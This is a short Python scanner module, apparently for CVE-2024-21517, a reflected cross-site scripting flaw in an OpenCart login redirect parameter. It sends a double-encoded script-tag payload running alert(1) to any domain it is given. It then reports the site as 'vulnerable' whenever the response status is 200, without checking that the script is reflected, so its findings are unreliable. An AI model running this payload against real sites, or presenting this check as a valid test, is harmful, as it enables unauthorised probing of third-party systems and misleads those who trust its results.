import requests
import datetime

class cve_2024_21517():
	def reflected_xss(self, domain):
		payload = '/index.php?route=account/login&language=en-gb&redirect=%2522%253E%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E%253Cinput%2Btype%253D%2522hidden'
		url = 'https://'+domain+payload
		access_endpoint = requests.post(url, allow_redirects=True)
		time = datetime.datetime.now()
		if access_endpoint.status_code == 200 : return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-21517 : vulnerable'
		else : return f'[{time.hour}:{time.minute}:{time.microsecond}] CVE-2024-21517 : not vulnerable'
		
